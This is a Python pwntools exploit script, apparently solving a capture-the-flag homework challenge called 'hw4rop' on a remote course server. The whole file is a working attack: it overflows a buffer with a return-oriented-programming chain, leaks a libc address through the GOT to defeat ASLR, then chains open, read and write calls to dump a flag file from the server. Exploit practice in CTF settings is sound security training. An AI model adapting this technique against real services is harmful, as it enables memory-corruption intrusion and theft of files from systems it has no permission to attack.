#!/usr/bin/env python

from pwn import *
from pwnlib.log import *

elf = ELF('./hw4rop')
libc = ELF('./libc.so.6')

r = remote('csie.ctf.tw', 6041)

r.recvuntil('The flag is in /home/rop/flag\n')

rop = ROP('./hw4rop')
rop.write(1, elf.got['read'], 10)
rop.main()

r.send('A'*28 + rop.chain())

recv = r.recvn(4)
info(enhex(recv))

libc_base = u32(recv) - libc.symbols['read']
info('libc_base = %x' % libc_base)
libc.address += libc_base

filename = 0x080488F6
buf = elf.bss(0xc00)

r.recvuntil('The flag is in /home/rop/flag\n')

rop = ROP('./hw4rop')
rop.call(libc.symbols['open'], [filename, 0])
rop.read(3, buf, 100)
rop.write(1, buf, 100)

r.send('A'*20 + rop.chain())

r.interactive()
